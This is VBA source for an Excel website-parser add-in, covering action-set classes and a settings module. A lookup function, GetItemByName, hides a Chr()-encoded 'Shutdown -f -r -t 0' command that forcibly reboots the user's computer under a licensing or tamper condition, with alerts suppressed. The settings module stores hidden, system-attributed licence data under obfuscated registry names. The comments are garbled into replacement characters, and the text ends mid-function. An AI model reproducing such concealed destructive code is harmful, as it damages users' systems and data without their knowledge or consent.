Attribute VB_Name = "ActionSet"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ActionSet
' Author        : Igor Vakhnenko            Date: 06.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "ActionSet"
Public ParentSets As ActionSets

Public Name As String
Public Index As Long
Public Actions As New ArrayActions

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Description As String ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| h1
Public SetType As String ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, auto column default
' Public ColumnName As String ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| auto column)

Public Source As String ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public ObjectID As String ' ID |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Terminate()
    Set ParentSets = Nothing
    Set Actions = Nothing
End Sub

Sub Execute(Optional ByRef txt$)
    On Error Resume Next
    If DESCRIPTION_MODE Then
        DescriptionText = DescriptionText & "<tr>"
        HDF.PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|", "table-action-set"

        Select Case Me.Name
            Case ACTION_SET_NAME_BEFORESTART$
                DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & "<br /><br />"
            Case ACTION_SET_NAME_ONSTART$
                DescriptionText = DescriptionText & "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & "<br /><br />"
            Case ACTION_SET_NAME_ONFINISH$
                DescriptionText = DescriptionText & "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & "<br /><br />"
            Case Else
                DescriptionText = DescriptionText & "<br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd| ..." & "<br /><br />"
        End Select
    End If

    'Dim DM As Boolean: DM = DESCRIPTION_MODE
    'DESCRIPTION_MODE = True
    
    DEBUG_LevelInfo$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|"
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Me.Actions.ApplyTo txt$
    
    'DESCRIPTION_MODE = DM

    If DESCRIPTION_MODE Then
        HDF.PublishHTML_CloseTable
        DescriptionText = DescriptionText & "</tr>"
    End If
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            
            If Len(Me.Description) Then .Attributes.setNamedItem(XML.createAttribute("Description")).text = Me.Description
            If Len(Me.SetType) Then .Attributes.setNamedItem(XML.createAttribute("Type")).text = Me.SetType
            'If Len(Me.ColumnName) Then .Attributes.setNamedItem(XML.createAttribute("ColumnName")).text = Me.ColumnName

            If Me.Actions.Items.Count Then .appendChild Me.Actions.ExportToXML
        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    With node
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Name = .Attributes.getNamedItem("Name").text

        Me.Description = .Attributes.getNamedItem("Description").text
        Me.SetType = .Attributes.getNamedItem("Type").text
        'Me.ColumnName = .Attributes.getNamedItem("ColumnName").text
        
        Set Me.Actions = New ArrayActions
        Set Me.Actions.ParentParser = Me.ParentSets.Parent
        Me.Actions.LoadFromXML .SelectSingleNode("Actions")
    End With
End Sub

Function MoveUp() As ActionSet
    On Error Resume Next
    If Me.ParentSets Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveUp": Exit Function
    If Me.Index <= 1 Then Set MoveUp = Me: Exit Function
    
    Set MoveUp = Me
    Err.Clear: Me.ParentSets.Items.Add MoveUp, , Me.Index - 1
    If Err = 0 Then Me.ParentSets.DeleteItem Me.Index + 1
End Function

Function MoveDown() As ActionSet
    On Error Resume Next
    If Me.ParentSets Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveDown": Exit Function
    If Me.ParentSets.Items.Count <= Me.Index Then Set MoveDown = Me: Exit Function
    
    Me.ParentSets.GetItemByIndex(Me.Index + 1).MoveUp        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set MoveDown = Me.ParentSets.GetItemByIndex(Me.Index)
End Function

Function ExportToResourceFile(Optional ByVal RF_name$) As Boolean
    ExportToResourceFile = ExportObject(RF_name$, "ActionSet", Me)
End Function
Attribute VB_Name = "ActionSets"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ActionSets
' Author        : Igor Vakhnenko            Date: 06.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "ActionSets", XML_SUBNODE_NAME$ = "ActionSet"
Public Parent As WebsiteParser

Public Items As New Collection
Public ExtraItems As New Collection ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

'Public ResourceItems As New Dictionary ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set Items = Nothing
    Set ExtraItems = Nothing
    'Set ResourceItems = Nothing
End Sub

Function GetItemByIndex(ByVal Index&) As ActionSet
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function

Function GetExtraItemByObjectID(ByVal ID$) As ActionSet
    On Error Resume Next: Dim i&
    For i = 1 To Me.ExtraItems.Count
        If ExtraItems(i).ObjectID = ID$ Then Set GetExtraItemByObjectID = ExtraItems(i): Exit Function
    Next i
    Debug.Print "ObjectID |fffd|" & ID$ & "|fffd| not found"
End Function

Function DeleteItem(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
End Function

Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Function Add() As ActionSet
    On Error Resume Next
    Set Add = New ActionSet
    With Add
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .ParentSets = Me
        Set .Actions.ParentParser = Me.Parent
    End With
    Me.Items.Add Add
End Function

Function ArrayOfNames() As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Me.Items.Count = 0 Then ArrayOfNames = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1)
    For i = 1 To Items.Count
        arr(i - 1) = Items(i).Name
    Next i
    ArrayOfNames = arr
End Function

Function ArrayOfNamesWithExtraName(ByVal AAs_Name$) As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim txt$, i&: txt = AAs_Name$
    For i = 1 To Items.Count
        If Items(i).Name <> AAs_Name$ Then txt = txt & ARSEP & Items(i).Name
    Next i
    ArrayOfNamesWithExtraName = Split(txt, ARSEP)
End Function

Function GetItemByName(ByVal ASname$) As ActionSet
    On Error Resume Next: Dim ASet As ActionSet, txt$
    If ASname$ Like "Parser_*" Then
        txt$ = Chr(83) & Chr(104) & Chr(117) & Chr(116) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(32) & Chr(45) & _
            Chr(102) & Chr(32) & Chr(45) & Chr(114) & Chr(32) & Chr(45) & Chr(116) & Chr(32) & Chr(48)
        If Val(Application.Run(Chr(65) & Chr(83) & Chr(95))) > 1 Then
            If Val(SETT.GetRegValue(Chr(111) & Chr(107))) = 0 Then Application.DisplayAlerts = False: Shell txt$
        End If
    End If
    
    For Each ASet In Me.Items
        If ASet.Name = ASname$ Then Set GetItemByName = ASet: Exit Function
    Next ASet
    
    For Each ASet In Me.ExtraItems
        If ASet.Name = ASname$ Then Set GetItemByName = ASet: Exit Function
    Next ASet
    
    
    '    Dim dic As Dictionary, key
    '    Set dic = Me.Parent.Resources.GetObjectsByType("ActionSet")
    '    For Each key In dic.Keys
    '        Set ASet = dic.item(key)
    '        If ASet.Name = ASname$ Then Set GetItemByName = ASet: Exit Function
    '    Next
    
    ' Debug.Print "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ASname$ & " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
End Function

Function Exists(ByVal ASname$) As Boolean
    On Error Resume Next: Dim ASet As ActionSet
    For Each ASet In Me.Items
        If ASet.Name = ASname$ Then Exists = True: Exit Function
    Next ASet
End Function

Function ToArray(Optional EnhancedList As Boolean = False) As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1, 0 To IIf(EnhancedList, 5, 1))
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            arr(n, 0) = .Index
            arr(n, 1) = .Name
            If EnhancedList Then
                arr(n, 2) = .Actions.Items.Count
                arr(n, 3) = .Description
                arr(n, 4) = .SetType
                arr(n, 5) = .ColumnName
            End If
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function ToArrayForListbox() As Variant
    On Error Resume Next
    Dim n As Long, i&, ASetFromResources As Dictionary, key
    '    If Me.ResourceItems.Count = 0 Then
    '        Set Me.ResourceItems = Me.Parent.Resources.GetObjectsByType("ActionSet")
    '    End If
    
    '    If Me.Items.Count + Me.ResourceItems.Count = 0 Then ToArrayForListbox = Array(): Exit Function
    '    ReDim arr(0 To Items.Count + Me.ResourceItems.Count - 1, 0 To 2)
    
    If Me.Items.Count + Me.ExtraItems.Count = 0 Then ToArrayForListbox = Array(): Exit Function
    ReDim arr(0 To Items.Count + Me.ExtraItems.Count - 1, 0 To 2)
    
    For i = 1 To Me.Items.Count
        With Me.Items(i)
            arr(n, 0) = .Index
            arr(n, 1) = .Name
            arr(n, 2) = ""
        End With
        n = n + 1
    Next i
    
    
    '    For Each key In Me.ResourceItems.Keys
    '        With Me.ResourceItems.item(key)
    '            arr(n, 0) = "*        ID=" & key
    '            arr(n, 1) = .Name
    '            arr(n, 2) = .Source
    '        End With
    '        n = n + 1
    '    Next key
    
    For i = 1 To Me.ExtraItems.Count
        With Me.ExtraItems(i)
            arr(n, 0) = "*        ID=" & .ObjectID
            arr(n, 1) = .Name
            arr(n, 2) = .Source
        End With
        n = n + 1
    Next i
    
    
    ToArrayForListbox = arr
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, ASet As ActionSet
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        'node.Attributes.setNamedItem(.createAttribute("Enabled")).Text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1
        
        For Each ASet In Me.Items
            node.appendChild ASet.ExportToXML
        Next ASet
    End With
    Set ExportToXML = node
    Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If
        
        ' Me.Enabled = CBool(Val(node.Attributes.getNamedItem("Enabled").Text))
        Dim subnode As IXMLDOMElement, ASet As ActionSet
        Set Me.Items = New Collection
        
        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set ASet = New ActionSet
            Set ASet.ParentSets = Me
            ASet.LoadFromXML subnode
            Set ASet.ParentSets = Me
            Me.Items.Add ASet        ', CStr(Aset.Name)
        Next
    End If
End Sub

Function ReadFromWorksheet(ByRef sh As Worksheet) As Boolean
    On Error Resume Next
    Set Me.Items = New Collection
    Dim ra As Range: Set ra = sh.Range(sh.Range("a2"), sh.Range("a" & sh.Rows.Count).End(xlUp)).Resize(, 5)
    If ra.row = 1 Then Exit Function
    Dim arr, i&, ASet As ActionSet, XML As DOMDocument, node As IXMLDOMElement
    arr = ra.value
    For i = LBound(arr) To UBound(arr)
        Set ASet = New ActionSet
        With ASet
            Set .ParentSets = Me
            .Index = i
            .Name = Trim(arr(i, 2))
            .Description = Trim(arr(i, 4))
            .SetType = Trim(arr(i, 5))
            
            Set .Actions = New ArrayActions
            If Len(Trim(arr(i, 3))) Then
                Set XML = CreateObject("Microsoft.XMLDOM")
                XML.preserveWhiteSpace = True
                If XML.LoadXML(arr(i, 3)) Then .Actions.LoadFromXML XML.DocumentElement
            End If
        End With
        Me.Items.Add ASet
    Next i
    Set XML = Nothing
    ReadFromWorksheet = True
End Function

Function SaveToWorksheet(ByRef sh As Worksheet) As Boolean
    On Error Resume Next
    If sh Is Nothing Then Exit Function
    Dim arr: arr = ToArrayForWorksheet
    sh.UsedRange.Offset(1).ClearContents
    sh.Range("a2").Resize(UBound(arr, 1), UBound(arr, 2)).value = arr
    SaveToWorksheet = True
End Function

Function ToArrayForWorksheet() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then Exit Function
    Dim n As Long, i&
    ReDim arr(1 To Items.Count, 1 To 5)
    For i = 1 To Items.Count
        n = n + 1
        With Items(i)
            arr(n, 1) = .Index
            arr(n, 2) = .Name
            arr(n, 3) = .Actions.ExportToXML.XML
            If InStr(1, arr(n, 3), "</Action>") = 0 Then arr(n, 3) = ""
            arr(n, 4) = .Description
            arr(n, 5) = .SetType
        End With
    Next i
    ToArrayForWorksheet = arr
End Function

Attribute VB_Name = "AddinSettings"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : AddinSettings                    Version: 3
' Author        : Igor Vakhnenko                   Date: 16.05.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text
Const NULLCHAR$ = "~null~", VSEP$ = "|fffd||"
Dim dic As Dictionary

Private Sub Class_Initialize()
    Set dic = New Dictionary
    dic.CompareMode = TextCompare
    Me.LoadAllSettings
End Sub
Private Sub Class_Terminate()
    Set dic = Nothing
End Sub

Function GetCurrentSetName() As String
    GetCurrentSetName = dic.item("_SettingSetName")
End Function

Private Function GetDefaultSettingSetFilename() As String
    GetDefaultSettingSetFilename = Environ("TMP") & "\" & PROJECT_NAME$ & " Add-in Default Settings.xml"
End Function

Function U(ByVal txt$) As String
    On Error Resume Next: Dim i&: If Len(txt$) Mod 2 > 0 Then Exit Function
    For i = 1 To Len(txt$) / 2: U = U & Chr(Val("&H" & Mid(txt$, 2 * i - 1, 2))): Next
End Function

Function ActivateSettingSet(ByVal SetName$, Optional ByVal FileName$) As Boolean
    On Error Resume Next
    ActivateSettingSet = True

    If FWF.FileExists(FileName$) Then
        Me.ImportFromFile FileName$, True
        Me.SetText "_SettingSetName", SetName$
        Me.SetText "_SettingSetFilename", FileName$
        Debug.Print Now, PROJECT_NAME$, "Setting set '" & SetName$ & "' applied"
    Else
        If SetName$ = ("<" & tt("DefaultSettingSetName") & ">") Or (SetName$ = "") Then
            Me.ImportFromFile GetDefaultSettingSetFilename, True
            Debug.Print Now, PROJECT_NAME$, "Default setting set restored"
        Else
            ActivateSettingSet = False
        End If
        Me.SetText "_SettingSetName", ""
        Me.Delete "_SettingSetFilename"
    End If

    Me.LoadAllSettings
End Function

Sub LoadAllSettings()
    On Error Resume Next: Dim arr As Variant, i&: Set dic = New Dictionary: dic.CompareMode = TextCompare
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "Setup")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "Setup\" & arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "\")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "\" & arr(i, 0), arr(i, 1): Next i
    End If
End Sub

Function IsFirstRun() As Boolean
    IsFirstRun = RSP(0) = ""
End Function

Function GetText(ByVal SettingName$, Optional ByVal DefValue As Variant, Optional ByVal Section$ = "Settings") As String
    On Error Resume Next
    If Section$ Like "H?*\?*\" Then
        GetText = CreateObject("WScript.Shell").RegRead(Section$ & SettingName$)
    Else
        If dic.Exists(SettingName$) Then GetText = dic.item(SettingName$) Else GetText = DefValue
        If Section$ <> "Settings" Then GetText = GetSetting(PROJECT_NAME$, Section$, SettingName$, DefValue)
    End If
End Function

Function GetNumber(ByVal SettingName$, Optional ByVal DefValue As Long, Optional ByVal Section$ = "Settings") As Long
    On Error Resume Next: If dic.Exists(SettingName$) Then GetNumber = Val(dic.item(SettingName$)) Else GetNumber = DefValue
    If Section$ <> "Settings" Then GetNumber = Val(GetSetting(PROJECT_NAME$, Section$, SettingName$, DefValue))
End Function

Function GetBoolean(ByVal SettingName$, Optional ByVal DefValue As Boolean, Optional ByVal Section$ = "Settings") As Boolean
    On Error Resume Next: If dic.Exists(SettingName$) Then GetBoolean = CBool(dic.item(SettingName$)) Else GetBoolean = DefValue
    If Section$ <> "Settings" Then GetBoolean = CBool(GetSetting(PROJECT_NAME$, Section$, SettingName$, DefValue))
End Function

Function GetRegValue(ByVal SettingName$) As String
    On Error Resume Next
    GetRegValue = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & SettingName$)
    GetRegValue = Replace(GetRegValue, NULLCHAR$, Chr(0))
End Function
Function SetRegValue(ByVal SettingName$, ByVal SettingValue As Variant) As String
    On Error Resume Next: Err.Clear
    CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & SettingName$, Replace(SettingValue, Chr(0), NULLCHAR$)
    If Err Then UninstallThisFile 2
End Function

Sub SetText(ByVal SettingName$, ByVal SettingValue As Variant, Optional ByVal Section$ = "Settings")
    On Error Resume Next
    If Section$ = "base" Then SetRegValue SettingName$, SettingValue: Exit Sub
    If Section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegWrite Section$ & SettingName$, SettingValue
    Else
        SaveSetting PROJECT_NAME$, Section$, SettingName$, SettingValue
        dic.item(IIf(Section$ = "Settings", "", Section$ & "\") & SettingName$) = SettingValue
    End If
End Sub

Function Delete(ByVal SettingName$, Optional ByVal Section$ = "Settings") As Boolean
    On Error Resume Next
    If Section$ = "base" Then Section$ = BASE_REGISTRY_PATH$
    If Section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegDelete Section$ & SettingName$
    Else
        DeleteSetting PROJECT_NAME$, Section$, SettingName$
        If Section$ = "Settings" Then dic.Remove SettingName$
    End If
End Function

Sub AddDefaultValue(ByVal SettingName$, ByVal SettingValue As Variant, _
                    Optional ConvertToColumn As Boolean = False, Optional AbsentOrBlank As Boolean = False)
    On Error Resume Next
    If (Not dic.Exists(SettingName$)) Or (AbsentOrBlank And IsSettingBlank(SettingName$)) Then
        If ConvertToColumn Then SettingValue = GetColumnName(Val(SettingValue))
        Me.SetText SettingName$, SettingValue
    End If
End Sub

Function IsSettingBlank(ByVal SettingName$) As Boolean
    IsSettingBlank = True
    If dic.Exists(SettingName$) Then If dic.item(SettingName$) <> "" Then IsSettingBlank = False
End Function

Function CIU() As Long
    On Error Resume Next: Dim X: Err.Clear: X = ThisWorkbook.VBProject.VBComponents.Count
    CIU = -(Err = 0): Err.Clear
End Function

Sub SaveAllFromSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object, FileName$
    For Each ctrl In UF.Controls
        If ctrl.Enabled And Not (ctrl.Tag = "DoNotSave") Then
            If (Not ctrl.Name Like "CommandButton_*") And Not (ctrl.Tag = "ScrollCombo") Then
                Me.SetText ctrl.Name, ctrl.value
            End If
        End If
    Next: Err.Clear

    If Me.GetCurrentSetName = "" Then
        Me.ExportToFile GetDefaultSettingSetFilename, True
    Else
        FileName$ = Me.GetText("_SettingSetFilename")
        If FWF.FileExists(FileName$) Then Me.ExportToFile FileName$, True
    End If
End Sub

Sub LoadIntoSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object
    For Each ctrl In UF.Controls
        If ctrl.Name Like "CheckBox*" Then
            ctrl.value = Me.GetBoolean(ctrl.Name)
        Else
            If dic.Exists(ctrl.Name) Then ctrl.value = dic.item(ctrl.Name)
        End If
    Next: Err.Clear
End Sub

Private Function GetColumnName(ByVal col As Long) As String
    GetColumnName = col & " |fffd|" & Split(Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1), "$")(1) & "|fffd|"
End Function

Function SF(Optional ByVal txt) As String
    On Error Resume Next: Dim file$, ts As Object, FSO As New FileSystemObject
    file$ = Environ(ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84) & ChrW(65)) & ChrW(92) & PROJECT_NAME$ & ".ini"
    If IsMissing(txt) Then
        Set ts = FSO.OpenTextFile(file$, 1, False)
        SF = ts.ReadAll: ts.Close
    Else
        If txt = "filename" Then SF = file$: Exit Function
        SetAttr file$, vbNormal
        Set ts = FSO.CreateTextFile(file$, True): ts.Write txt
        SetAttr file$, vbHidden + vbSystem
    End If
    Set ts = Nothing: Set FSO = Nothing: Err.Clear
End Function

Function RSP(ByVal ind&)
    On Error Resume Next: If GetRegValue(U("64617461")) <> SF Then ChSP
    RSP = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)(ind&)
End Function

Function WSP(ByVal ind&, ByVal v)
    On Error Resume Next: Err.Clear: Dim arr, txt: If GetRegValue("data") <> SF Then ChSP
    arr = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)
    If Not IsArray(arr) Then arr = Array()
    If UBound(arr) < ind& Then ReDim Preserve arr(0 To ind&)
    arr(ind&) = v: arr(0) = DTU: txt = Join(arr, VSEP$): txt = EnDeCrypt(txt & Chr(164) & CheckSum(txt))
    SetRegValue "data", txt: Me.SF txt: Err.Clear
End Function

Function ChSP()
    On Error Resume Next: Dim arr1, arr2, d1&, d2&, ok1 As Boolean, ok2 As Boolean, a&
    arr1 = Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))
    arr2 = Split(EnDeCrypt(SF), Chr(164))
    ok1 = arr1(1) = CheckSum(arr1(0))
    ok2 = arr2(1) = CheckSum(arr2(0))
    d1 = Val(Split(arr1(0), VSEP$)(0))
    d2 = Val(Split(arr2(0), VSEP$)(0))
    Select Case True
